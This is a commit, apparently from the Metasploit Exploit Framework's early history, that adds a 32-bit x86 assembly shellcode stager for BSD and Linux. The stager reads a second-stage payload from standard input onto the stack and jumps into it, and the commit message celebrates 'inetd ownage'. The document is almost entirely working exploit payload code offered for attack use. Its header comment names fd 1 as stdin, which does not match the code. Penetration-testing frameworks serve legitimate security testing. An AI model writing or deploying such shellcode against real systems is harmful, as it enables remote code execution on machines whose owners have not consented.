d0e815b1ab647d60f95710e13ff08b53d35fb06b
no_author <no_author@no_author>
2004-12-22 04:41:45 +0000

    initial import, inetd ownage!

---
+++ src/shellcode/generic/ia32/stager_stdin.asm
@@ -0,0 +1,39 @@
+;;
+; 
+;        Name: stager_stdin
+;   Platforms: *BSD, Linux
+;     Authors: vlad902 <vlad902 [at] gmail.com>
+;     Version: $Revision$
+;     License: 
+;
+;        This file is part of the Metasploit Exploit Framework
+;        and is subject to the same licenses and copyrights as
+;        the rest of this package.
+;
+; Description:
+;
+;        Read a second stage from fd 1 (stdin). 
+;        
+;
+;;
+BITS 32
+
+section .text
+global _start
+
+_start:
+	push	byte 0x03
+	pop	eax
+	xor	ebx, ebx
+	mov	ecx, esp
+	cdq
+	mov	dh, 0x08
+
+	push	edx
+	push	ecx
+	push	ebx
+	push	ecx
+
+	int	0x80
+
+	ret
